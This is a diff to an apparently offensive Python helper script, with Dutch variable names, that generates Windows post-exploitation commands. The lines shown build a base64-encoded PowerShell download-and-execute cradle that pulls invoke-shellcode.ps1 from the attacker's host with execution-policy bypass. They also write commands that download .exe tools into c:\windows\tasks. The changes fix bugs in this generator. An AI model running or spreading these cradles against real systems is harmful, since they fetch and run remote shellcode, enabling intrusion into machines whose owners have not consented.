@@ -89,7 +89,7 @@ if args.bestand:
 
 
     handig = tempiex.replace('/tools/','/payloads/').replace('[ip]',args.lhost).replace('[bestand]','invoke-shellcode.ps1')
-    encoded ="IEX(New-Object Net.WebClient).downloadString('http://[ip]/payloads/[bestand]')".replace('[ip]',args.lhost).replace('[bestand]',bestand).encode('utf-16-le')
+    encoded ="IEX(New-Object Net.WebClient).downloadString('http://[ip]/payloads/[bestand]')".replace('[ip]',args.lhost).replace('[bestand]','invoke-shellcode.ps1').encode('utf-16-le')
     b64 = base64.b64encode(encoded)
     uit1 = uit1 + handig + '\npowershell -Version 2 -exec bypass -enc '+str(b64, 'utf-8')+'\n'
 
@@ -108,14 +108,14 @@ if args.bestand:
             else:
 
 
-                if bestand.endwith('.exe'):
+                if bestand.endswith('.exe'):
 
                     if bestand.startswith('f'):
                         bestand = '\\'+bestand
 
                     voo2 = tempdown.replace('[ip]',args.lhost).replace('[bestand]',bestand) 
                     uit2 = uit2 + voo2
-                    naam = bestand.split('.exe')
+                    naam = bestand.split('.exe')[0]
                     #werkt waarschijnlijk bij alle windows systemen sinds 2013 en later (PowerShell 4)
                     schrijven('http/commands/get_'+naam.lower().replace(' ',''), "powershell -c (new-object System.Net.WebClient).DownloadFile('http://[ip]/tools/[bestand]','c:\\windows\\tasks\\[bestand]')".replace('[ip]',args.lhost).replace('[bestand]',bestand))
                     uit2 =uit2 + "./command.sh [screenname] get_"+naam.lower().replace(' ','')+"\n"
